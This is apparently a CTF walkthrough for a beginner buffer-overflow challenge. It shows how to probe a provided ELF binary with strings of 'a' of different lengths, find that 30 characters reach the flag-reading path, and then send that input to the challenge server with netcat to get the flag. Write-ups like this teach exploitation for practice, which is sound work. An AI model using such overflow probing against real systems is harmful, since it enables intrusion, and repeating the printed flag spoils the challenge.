# Step 1 

```
Download the attachment aaa and make it executable (chmod +x aaa)
```
# Step 2

```
Run the elf exectuable , it prompts for username and password.
```
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ ./aaa
Enter username and password, separated by spaces:
```
Enter larger values and see if it overflows.
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ ./aaa
Enter username and password, separated by spaces:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cat: flag.txt: No such file or directory
zsh: segmentation fault  ./aaa
```
Segmentation flault points to buffer overflow.
It's a easy chall that means not much technical, let's try to find the number of 'a' when it does or doesn't overflow.

# Step 3
To generate the countable number of a's use python one liner.
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ python -c "print 'a'*50"                                                                                                                           139 ⨯
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
Copy and paste the a'a and see it overflows.
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ python -c "print 'a'*10"
aaaaaaaaaa
                                                                                                                                                             
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ ./aaa
Enter username and password, separated by spaces:
aaaaaaaaaa
```
No overflow, repeat the steps and narrow down the gap.
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ python -c "print 'a'*30"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                                                                                                                                                             
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ ./aaa
Enter username and password, separated by spaces:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cat: flag.txt: No such file or directory
```
Reading flag.txt and no overflow, let's try 30 a's connecting via netcat to oroginal given connection.
```bash
┌──(kali㉿kali)-[~/ctf/imaginary]
└─$ nc oreos.ctfchallenge.ga 7331
Enter username and password, separated by spaces:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ictf{buff3r_0verfl0w_1s_d4ng3r0us}
```
# Step 3
Submit the flag.